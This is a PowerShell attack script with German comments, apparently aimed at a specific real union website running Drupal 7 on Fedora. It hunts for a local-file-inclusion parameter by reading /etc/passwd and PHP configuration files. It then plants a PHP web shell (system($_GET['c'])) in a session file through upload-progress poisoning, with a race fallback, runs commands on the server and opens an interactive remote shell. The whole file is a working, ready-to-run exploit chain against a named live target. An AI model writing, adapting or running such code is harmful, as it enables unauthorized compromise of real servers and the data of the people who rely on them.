#Requires -Version 5.1
<#
  ufcw_chain3.ps1 - Fedora/Drupal-7-Variante
  TLS: schannel-Renegotiation umgangen, Retries, Cache-Buster, Cookie erzwungen
#>
[CmdletBinding()]
param(
    [string] $Base = 'https://ufcw464a.org/',
    [string] $SessId = 'p2s8db650e9333e4c99',
    [string] $Cmd = 'id',
    [switch] $NoShell,
    [switch] $NoRace
)

$ErrorActionPreference = 'Continue'
$Log = Join-Path (Get-Location) ("ufcw3_{0}.log" -f (Get-Date -Format 'yyyyMMdd_HHmmss'))
$Tmp = Join-Path $env:TEMP ("ufcw_" + [Guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $Tmp -Force | Out-Null
$PlF = Join-Path $Tmp 'pl.txt'; $PadF = Join-Path $Tmp 'pad.bin'; $Dm = Join-Path $Tmp 'a.txt'; $Bd = Join-Path $Tmp 'body.bin'
[IO.File]::WriteAllText($Dm, 'X')

function Log([string]$m, [string]$c = 'Gray') {
    $l = "[{0}] {1}" -f (Get-Date -Format 'HH:mm:ss'), $m
    Write-Host $l -ForegroundColor $c
    Add-Content -LiteralPath $Log -Value $l -Encoding UTF8
}
function Head([string]$m) { Log ''; Log ('=' * 68) 'DarkCyan'; Log $m 'Cyan'; Log ('=' * 68) 'DarkCyan' }

$TLS = @('--silent','--show-error','--tlsv1.2','--tls-max','1.2','--ssl-no-revoke','--insecure','--http1.1','--compressed','--max-time','30')
function C([string]$Url, [string[]]$Extra, [switch]$Head) {
    $a = @() + $TLS
    if ($Head) { $a += '--head' } else { $a += @('--output',$Bd,'--write-out','%{http_code} %{time_total}') }
    if ($Extra) { $a += $Extra }
    $a += $Url
    $code = 0; $body = ''; $sw = [Diagnostics.Stopwatch]::StartNew()
    for ($try = 1; $try -le 4; $try++) {
        $w = @(& curl.exe @a 2>&1)
        $sw.Stop()
        if ($w.Count) { $code = ($w[-1] -split '\s+')[0] -as [int] }
        if ($code -ne 0 -and $code -lt 400) { break }
        Start-Sleep -Milliseconds (300 * $try)
    }
    if (-not $Head -and (Test-Path $Bd)) { try { $body = [IO.File]::ReadAllText($Bd,[Text.Encoding]::UTF8) } catch {}; Remove-Item $Bd -Force -EA SilentlyContinue }
    [pscustomobject]@{ Code = $code; Body = $body; Ms = $sw.ElapsedMilliseconds; Raw = ($w -join "`n") }
}
function CB { "_cb=" + [Guid]::NewGuid().ToString('N').Substring(0,8) }
function Get-Lfi([string]$path) {
    $r = C "$Base`?$Param=php://filter/convert.base64-encode/resource=$path&$(CB)" @($CK)
    if ($r.Code -ne 200 -or -not $r.Body) { return $null }
    $best = ''
    foreach ($m in [regex]::Matches($r.Body,'[A-Za-z0-9+/=\s]{24,}')) { $v = $m.Value -replace '\s',''; if ($v.Length -gt $best.Length) { $best = $v } }
    if (-not $best) { return $null }
    try { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($best)) } catch { $null }
}
function Get-Inc([string]$path,[string]$extra = '') { C "$Base`?$Param=$path&$(CB)$extra" @($CK) }

# ---------------------------------------------------- 0
Head '0 - Transport'
if (-not (Get-Command curl.exe -EA SilentlyContinue)) { Log 'curl.exe fehlt' 'Red'; return }
$r0 = C $Base $null
Log ("GET / -> code={0} {1}ms {2}B" -f $r0.Code,$r0.Ms,$r0.Body.Length)
if ($r0.Code -ne 200) { Log 'Transport tot:' 'Red'; Log $r0.Raw 'DarkGray'; return }
$hh = C $Base $null -Head
if ($hh.Raw -match '(?im)^Server:\s*(.+)$') { Log ("Server: {0}" -f $Matches[1].Trim()) 'DarkGray' }
if ($r0.Body -match 'Drupal') { Log 'Drupal erkannt' 'DarkGray' }

# ---------------------------------------------------- 1
Head '1 - Parameter'
$Param = $null; $Exec = $false
foreach ($p in 'file','lang','view','inc','path','doc','tpl','download','f','page','q') {
    $pl = C "$Base`?$p=/etc/passwd&$(CB)" @($CK)
    $fi = C "$Base`?$p=php://filter/convert.base64-encode/resource=/etc/passwd&$(CB)" @($CK)
    $hp = $pl.Body -match 'root:x:0:0'; $hf = $false
    if ($fi.Body) { $b=''; foreach ($m in [regex]::Matches($fi.Body,'[A-Za-z0-9+/=\s]{24,}')) { $v=$m.Value -replace '\s',''; if ($v.Length -gt $b.Length) { $b=$v } }; if ($b) { try { $hf = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) -match 'root:x:0:0' } catch {} } }
    $t = if ($hp) {'PLAIN'} elseif ($hf) {'FILTER'} else {'nein'}
    Log ("  {0,-10} {1}" -f $p,$t) $(if($t -ne 'nein'){'Green'}else{'DarkGray'})
    if ($t -ne 'nein' -and -not $Param) { $Param = $p; $Exec = $hp }
    Start-Sleep -Milliseconds 120
}
if (-not $Param) { Log 'Kein Parameter. Pruefe von Hand, ob ?file=/etc/passwd ueberhaupt reagiert.' 'Red'; return }
Log ("Parameter={0} includet={1}" -f $Param,$Exec) $(if($Exec){'Green'}else{'Yellow'})

# ---------------------------------------------------- 2
Head '2 - Fedora-Konfiguration'
$ini = $null
foreach ($f in '/etc/php.ini','/etc/php.d/20-session.ini','/etc/php.d/30-mysqlnd.ini','/etc/php.d/30-pdo_mysql.ini') {
    $c = Get-Lfi $f
    if ($c -and $c -match 'memory_limit|session') { $ini = $c; Log ("ini: {0}" -f $f) 'Green'; break }
    Start-Sleep -Milliseconds 100
}
$SavePath = $null; $Limit = 0; $Handler = 'php'
if ($ini) {
    $m=[regex]::Match($ini,'(?m)^\s*session\.save_path\s*=\s*"?([^"\r\n]+)"?'); if($m.Success){$SavePath=$m.Groups[1].Value.Trim()}
    $m=[regex]::Match($ini,'(?m)^\s*memory_limit\s*=\s*"?(\d+)([KMG]?)'); if($m.Success){$n=[int64]$m.Groups[1].Value; switch($m.Groups[2].Value.ToUpper()){'K'{$n*=1024}'M'{$n*=1048576}'G'{$n*=1073741824}}; $Limit=$n}
    $m=[regex]::Match($ini,'(?m)^\s*session\.serialize_handler\s*=\s*(\S+)'); if($m.Success){$Handler=$m.Groups[1].Value.Trim()}
    $m=[regex]::Match($ini,'(?m)^\s*session\.save_handler\s*=\s*(\S+)'); if($m.Success){Log ("save_handler={0}" -f $m.Groups[1].Value) 'Cyan'}
    foreach($k in 'session.use_strict_mode','session.upload_progress.enabled','session.upload_progress.cleanup'){ $mm=[regex]::Match($ini,"(?m)^\s*$([regex]::Escape($k))\s*=\s*(\S+)"); if($mm.Success){Log ("{0}={1}" -f $k,$mm.Groups[1].Value) 'DarkGray'} }
}
if (-not $SavePath) { $SavePath = '/var/lib/php/session' }
if ($Limit -le 0) { $Limit = 262144 }
Log ("save_path={0} limit={1} handler={2}" -f $SavePath,$Limit,$Handler) 'Cyan'

# ---------------------------------------------------- 3
Head '3 - Session-Datei'
$dirs = @($SavePath,'/var/lib/php/session','/var/lib/php/sessions','/tmp','/var/lib/php5','/var/www/html/sites/default/files') | Select-Object -Unique
$Sess = $null
foreach ($d in $dirs) {
    $c = Get-Lfi "$d/sess_$SessId"
    Log ("  {0,-34} {1}" -f $d,$(if($null -eq $c){'-'}else{"$($c.Length)B"})) $(if($null -ne $c){'Green'}else{'DarkGray'})
    if ($null -ne $c -and -not $Sess) { $Sess = "$d/sess_$SessId" }
    Start-Sleep -Milliseconds 100
}
if (-not $Sess) { $Sess = "$SavePath/sess_$SessId"; Log 'Standardpfad angenommen' 'Yellow' } else { Log ("Ziel: {0}" -f $Sess) 'Green' }
$CK = "Cookie: PHPSESSID=$SessId"

# ---------------------------------------------------- 4
Head '4 - strict_mode'
$rc = C $Base @("Cookie: PHPSESSID=$SessId") -Head
if ($rc.Raw -match 'PHPSESSID=([^;\s]+)' -and $Matches[1] -ne $SessId) {
    Log ("neue ID {0}" -f $Matches[1]) 'Yellow'
    $SessId = $Matches[1]; $CK = "Cookie: PHPSESSID=$SessId"; $Sess = $null
    foreach ($d in $dirs) { $c = Get-Lfi "$d/sess_$SessId"; if ($null -ne $c) { $Sess = "$d/sess_$SessId"; break } }
    if (-not $Sess) { $Sess = "$SavePath/sess_$SessId" }
} else { Log 'strict_mode aus' 'Green' }

# ---------------------------------------------------- 5
Head '5 - Payload'
$PL = '<?php echo ''PWN:'';system($_GET[''c'']);?>'
[IO.File]::WriteAllText($PlF,$PL)
Log $PL 'DarkGray'
$pr = C "$Base`?$(CB)" @('--form',"PHP_SESSION_UPLOAD_PROGRESS=<$PlF",'--form',"f=@$Dm;filename=a.txt",'--header',$CK)
Start-Sleep -Milliseconds 250
$pf = Get-Inc $Sess
if ($pf.Body -match 'a:\d+:\{s:') { Log 'php_serialize' 'Yellow' } elseif ($pf.Body -match 'upload_progress_') { Log 'php' 'Green' } else { Log 'Handler unklar' 'DarkGray' }

# ---------------------------------------------------- 6
Head '6 - OOM'
$sizes = @(($Limit-16384),($Limit-8192),($Limit-4096),$Limit,($Limit+4096),($Limit+8192),($Limit+32768),($Limit+65536)) | Where-Object { $_ -gt 0 } | Select-Object -Unique
$Poi = $false; $Used = 0
foreach ($s in $sizes) {
    [IO.File]::WriteAllText($PadF, ('A' * $s))
    $r = C "$Base`?$(CB)" @('--form',"PHP_SESSION_UPLOAD_PROGRESS=<$PlF",'--form',"pad=<$PadF",'--form',"f=@$Dm;filename=a.txt",'--header',$CK)
    Start-Sleep -Milliseconds 400
    $chk = Get-Inc $Sess
    $ex = $chk.Body -match 'PWN:'; $kp = $chk.Body -match 'upload_progress_'
    Log ("  pad {0,7} code={1} {2,5}ms {3}" -f $s,$r.Code,$r.Ms,$(if($ex){'EXEC'}elseif($kp){'liegt'}else{'leer'})) $(if($ex){'Green'}elseif($kp){'Yellow'}else{'DarkGray'})
    if ($ex -or $kp) { $Poi = $true; $Used = $s; break }
    Start-Sleep -Milliseconds 300
}
if (-not $Poi -and -not $NoRace) {
    Log 'Race-Fallback' 'Yellow'
    [IO.File]::WriteAllText($PadF, ('A' * 300000))
    $j = Start-Job { param($b,$h,$plf,$padf,$dm)
        for ($i=0;$i -lt 2500;$i++){ & curl.exe --silent --insecure --tlsv1.2 --tls-max 1.2 --http1.1 --max-time 30 --output NUL --header $h --form "PHP_SESSION_UPLOAD_PROGRESS=<$plf" --form "pad=<$padf" --form "f=@$dm;filename=a.txt" $b 2>&1 | Out-Null }
    } -ArgumentList $Base,$CK,$PlF,$PadF,$Dm
    for ($i=1;$i -le 150;$i++){ $t = Get-Inc $Sess '&c=id'; if ($t.Body -match 'uid=') { Log 'Treffer' 'Green'; $Poi=$true; break }; Start-Sleep -Milliseconds 250 }
    Stop-Job $j -EA SilentlyContinue; Remove-Job $j -Force -EA SilentlyContinue
}
if (-not $Poi) { Log 'Poison fehlgeschlagen' 'Red'; return }

# ---------------------------------------------------- 7
Head '7 - Trigger'
$out = $null
for ($i=1;$i -le 60;$i++) {
    $t = Get-Inc $Sess ('&c=' + [Uri]::EscapeDataString($Cmd))
    if ($t.Body -match 'PWN:([\s\S]{0,4000})') { $out = ($Matches[1] -replace '<[^>]+>','').Trim(); if ($out) { break } }
    Start-Sleep -Milliseconds 200
}
if ($out) { Log 'RCE:' 'Green'; Write-Host $out -ForegroundColor White } else { Log 'Kein Output' 'Red' }

# ---------------------------------------------------- 8
if ($out -and -not $NoShell) {
    Head '8 - Shell (leer = Ende)'
    while ($true) {
        $c = Read-Host 'ps> '
        if ([string]::IsNullOrWhiteSpace($c)) { break }
        $t = Get-Inc $Sess ('&c=' + [Uri]::EscapeDataString($c))
        if ($t.Body -match 'PWN:([\s\S]{0,6000})') { Write-Host (($Matches[1] -replace '<[^>]+>','').Trim()) -ForegroundColor White }
        else { Write-Host $t.Body.Substring(0,[Math]::Min(300,$t.Body.Length)) -ForegroundColor DarkGray }
    }
}
Head 'Ende'; Log ("Param={0} ID={1} Datei={2} Pad={3}" -f $Param,$SessId,$Sess,$Used) 'Cyan'